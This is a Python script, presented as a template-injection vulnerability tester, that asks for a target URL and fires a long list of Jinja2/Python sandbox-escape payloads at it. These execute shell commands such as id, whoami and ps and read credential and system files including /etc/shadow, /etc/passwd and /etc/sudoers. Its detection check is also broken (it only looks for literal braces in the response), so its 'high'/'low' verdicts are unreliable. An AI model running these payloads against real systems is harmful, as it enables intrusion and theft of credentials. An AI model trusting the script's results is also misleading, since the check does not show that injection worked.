import requests
from bs4 import BeautifulSoup

# Function to check if the target website is vulnerable to CSTI
def check_template_injection_vulnerability(url, payload):
    try:
        # Send a GET request to the target website with the payload
        response = requests.get(url + payload)

        # Parse HTML content using BeautifulSoup
        soup = BeautifulSoup(response.text, 'html.parser')

        # Check for potential indicators of CSTI vulnerability
        if "{{" in soup.text and "}}" in soup.text:
            return True
        else:
            return False
    except Exception as e:
        print(f"Error occurred while checking vulnerability for payload {payload}: {str(e)}")
        return False

# Function to provide guidance on testing the CSTI vulnerability
def guide_csti_testing():
    print("\nTesting for Client-Side Template Injection vulnerability...\n")
    print("1. Look for input fields where user-supplied data is rendered.")
    print("2. Inject template code like {{7*7}} and observe if it gets evaluated.")
    print("3. Check for any unexpected behavior or responses indicating successful injection.")
    print("\nFor example, try injecting {{7*7}} in a search box and see if the result is 49.\n")

# Main function
def run_csti_vulnerability_test():
    print("Client-Side Template Injection Vulnerability Tester")
    print("Welcome to Client-Side Template Injection Vulnerability Tester")

    # Prompt the user for the target website URL
    target_url = input("Enter your target website URL:")

    print("\nChecking if the target website is vulnerable...\n")
    if "{{" in target_url and "}}" in target_url:
        print("The target website URL contains potential indicators of CSTI vulnerability.")
        guide_csti_testing()

    # Additional payloads
    payloads = [
        "{{7*7}}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "{{''.__class__.__mro__[1].__subclasses__()[0]('ls').read()}}",
        "{{''.join([chr(ord(c) + 1) for c in 'hello'])}}",
        "{{''.join([chr(ord(c) - 1) for c in 'world'])}}",
        "{{request.application.__globals__.__builtins__.open('/etc/passwd').read()}}",
        "{{''.__class__.__base__.__subclasses__()}}",
        "{{''.__class__.__base__.__subclasses__[59]('id').read()}}",
        "{{config.items()}}",
        "{{request.url}}",
        "{{request.cookies}}",
        "{{request.headers}}",
        "{{request.json}}",
        "{{request.files}}",
        "{{request.form}}",
        "{{request.args}}",
        "{{request.values}}",
        "{{g.__class__.__bases__[0].__subclasses__()}}",
        "{{url_for.__globals__.os.popen('ls').read()}}",
        "{{url_for.__globals__.sys.modules['os'].popen('ls').read()}}",
        "{{url_for.__globals__.__builtins__.__import__('os').popen('ls').read()}}",
        "{{request.__class__.__mro__[2].__subclasses__()}}",
        "{{''.__class__.__mro__.pop(1)('ls').read()}}",
        "{{''.__class__.__mro__[1].__subclasses__()[0].__init__.__globals__['__builtins__']['__import__']('os').system('ls')}}",
        "{{''.__class__.__mro__[1].__subclasses__()[0]('cat /etc/passwd').read()}}",
        "{{''.__class__.__mro__[1].__subclasses__()[0]('id').read()}}",
        "{{''.__class__.__mro__[1].__subclasses__()[0]('uname -a').read()}}",
        "{{''.__class__.__mro__[1].__subclasses__()[0]('whoami').read()}}",
        "{{''.__class__.__mro__[1].__subclasses__()[0]('ifconfig').read()}}",
        "{{''.__class__.__mro__[1].__subclasses__()[0]('netstat -an').read()}}",
        "{{''.__class__.__mro__[1].__subclasses__()[0]('ps aux').read()}}",
        "{{''.__class__.__mro__[1].__subclasses__()[0]('grep root /etc/passwd').read()}}",
        "{{''.__class__.__mro__[1].__subclasses__()[0]('cat /etc/shadow').read()}}",
        "{{''.__class__.__mro__[1].__subclasses__()[0]('ls /').read()}}",
        "{{''.__class__.__mro__[1].__subclasses__()[0]('ls /etc').read()}}",
        "{{''.__class__.__mro__[1].__subclasses__()[0]('ls /home').read()}}",
        "{{''.__class__.__mro__[1].__subclasses__()[0]('ls /var/www').read()}}",
        "{{''.__class__.__mro__[1].__subclasses__()[0]('ls /var/log').read()}}",
        "{{''.__class__.__mro__[1].__subclasses__()[0]('cat /etc/hosts').read()}}",
        "{{''.__class__.__mro__[1].__subclasses__()[0]('cat /etc/resolv.conf').read()}}",
        "{{''.__class__.__mro__[1].__subclasses__()[0]('cat /etc/hostname').read()}}",
        "{{''.__class__.__mro__[1].__subclasses__()[0]('cat /etc/group').read()}}",
        "{{''.__class__.__mro__[1].__subclasses__()[0]('cat /etc/issue').read()}}",
        "{{''.__class__.__mro__[1].__subclasses__()[0]('cat /etc/motd').read()}}",
        "{{''.__class__.__mro__[1].__subclasses__()[0]('cat /etc/crontab').read()}}",
        "{{''.__class__.__mro__[1].__subclasses__()[0]('cat /etc/sysctl.conf').read()}}",
        "{{''.__class__.__mro__[1].__subclasses__()[0]('cat /etc/network/interfaces').read()}}",
        "{{''.__class__.__mro__[1].__subclasses__()[0]('cat /etc/ssh/sshd_config').read()}}",
        "{{''.__class__.__mro__[1].__subclasses__()[0]('cat /etc/sudoers').read()}}",
        "{{''.__class__.__mro__[1].__subclasses__()[0]('cat /etc/shells').read()}}"
    ]

    # Iterate through each payload and check vulnerability
    for payload in payloads:
        if check_template_injection_vulnerability(target_url, payload):
            print(f"Payload {payload} was successfully injected and vulnerable.")
            print("Vulnerability metric: high")
        else:
            print(f"Payload {payload} was not vulnerable.")
            print("Vulnerability metric: low")  # Adjust vulnerability metric based on your assessment

# Execute the main function
if __name__ == "__main__":
    run_csti_vulnerability_test()

       
